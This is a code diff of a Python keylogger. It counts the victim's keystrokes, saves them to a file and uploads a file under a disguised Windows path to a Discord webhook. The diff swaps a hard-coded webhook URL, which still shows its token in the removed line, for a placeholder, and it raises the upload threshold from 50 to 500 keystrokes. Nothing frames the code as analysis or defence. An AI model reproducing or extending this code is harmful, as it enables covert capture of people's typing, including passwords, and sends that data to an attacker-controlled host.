@@ -10,7 +10,6 @@ from PIL import ImageGrab, Image
 import time
 import psutil
 
-# Initialize the variables
 keystroke_count = 0
 keystrokes_str = ""
 
@@ -28,13 +27,13 @@ def on_press(key):
     keystroke_count += 1
 
     # Check if the keystroke limit is hit
-    if keystroke_count >= 50:
+    if keystroke_count >= 500:
         # Write the keystrokes to a file
         with open("keystrokes.txt", "a") as f:
             f.write(keystrokes_str)
 
         # Send the file through a Discord webhook
-        webhook_url = "https://discord.com/api/webhooks/1072255011184197632/9vmgmgiXwEl-n7PD5gTl3PbOJHAYXvvW94xirV-h5ctzm_-P2cXpNhQb_DPIHGPSwGD5"
+        webhook_url = "Discord webhook"
 
         file = {"file": open("C:\\Windows\\lIsetup.txt", "rb")}
         requests.post(webhook_url, files=file)
